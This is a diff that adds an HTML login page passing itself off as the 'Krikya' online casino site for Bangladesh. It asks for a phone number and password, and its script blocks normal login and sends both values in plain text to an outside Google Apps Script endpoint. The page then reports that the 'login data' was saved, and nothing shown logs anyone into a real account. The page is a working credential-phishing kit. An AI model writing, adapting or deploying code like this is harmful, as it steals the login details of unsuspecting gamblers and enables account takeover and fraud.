@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Krikya | Online Casino Bangladesh | IPL | Crazy Time</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }
+        header { background-color: #ff6600; color: white; text-align: center; padding: 20px; }
+        .container { max-width: 400px; margin: 50px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        form { display: flex; flex-direction: column; }
+        input { margin: 10px 0; padding: 10px; border: 1px solid #ccc; border-radius: 4px; }
+        button { background-color: #ff6600; color: white; padding: 10px; border: none; border-radius: 4px; cursor: pointer; }
+        button:hover { background-color: #e65c00; }
+        .forgot { text-align: center; margin-top: 10px; }
+        .no-js { text-align: center; color: red; }
+    </style>
+</head>
+<body>
+    <noscript>
+        <div class="no-js">
+            <p>We're sorry but the system doesn't work properly without JavaScript enabled. Please enable it to continue.</p>
+        </div>
+    </noscript>
+    <header>
+        <h1>Krikya | Online Casino Bangladesh | IPL | Crazy Time</h1>
+    </header>
+    <div class="container" id="login-container">
+        <h2>Login to Your Account</h2>
+        <form id="login-form">
+            <input type="tel" id="phone" placeholder="Phone Number (Username)" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
+        <div class="forgot">
+            <a href="#">Forgot Password?</a>
+        </div>
+    </div>
+
+    <script>
+       // Hide no-JS message if JS is enabled
+document.addEventListener('DOMContentLoaded', function() {
+    const noJs = document.querySelector('.no-js');
+    if (noJs) noJs.style.display = 'none';
+});
+
+// Form submission to Google Sheet
+const form = document.getElementById('login-form');
+form.addEventListener('submit', function(event) {
+    event.preventDefault();
+    const phone = document.getElementById('phone').value;
+    const password = document.getElementById('password').value;
+
+    // Send data to Google Apps Script
+    fetch('https://script.google.com/macros/s/AKfycbymmL-0dvCg85dep2rVAe-xuxaPtWQ4Il-_pCg0htsklgwb59c4-CpuPpn20yEMFTFg/exec', {  // Replace with your URL
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: `phone=${encodeURIComponent(phone)}&password=${encodeURIComponent(password)}`
+    }).then(() => {
+        alert('Login data saved successfully!');
+        form.reset();
+    }).catch(error => {
+        console.error('Error:', error);
+        alert('Error saving data.');
+    });
+});
